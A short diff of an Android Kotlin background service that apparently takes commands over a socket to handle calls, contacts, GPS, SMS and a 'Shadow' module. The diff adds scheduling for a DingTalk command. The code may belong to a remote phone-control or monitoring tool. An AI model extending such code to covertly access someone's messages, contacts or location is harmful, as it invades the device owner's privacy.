@@ -8,6 +8,7 @@ import android.os.IBinder
 import com.hc.calling.commands.Executor
 import com.hc.calling.commands.callingtransaction.Call
 import com.hc.calling.commands.contact.Contacts
+import com.hc.calling.commands.dingding.DingTalk
 import com.hc.calling.commands.gps.GPS
 import com.hc.calling.commands.shadow.Shadow
 import com.hc.calling.commands.sms.Sms
@@ -53,9 +54,13 @@ class MainService : Service() {
             this@MainService.registerReceiver(this, IntentFilter(Intent.ACTION_SCREEN_ON))
             this@MainService.registerReceiver(this, IntentFilter(Intent.ACTION_SCREEN_OFF))
         }
+//        this@MainService.registerReceiver(DingTalk.AlarmReciver(), IntentFilter("ding talk"))
+
         if (!SocketConductor.instance.socket!!.connected()) {
             SocketConductor.instance.socket!!.connect()
         }
+
+        DingTalk.initAlarmManager(this)
         return super.onStartCommand(intent, flags, startId)
     }
 
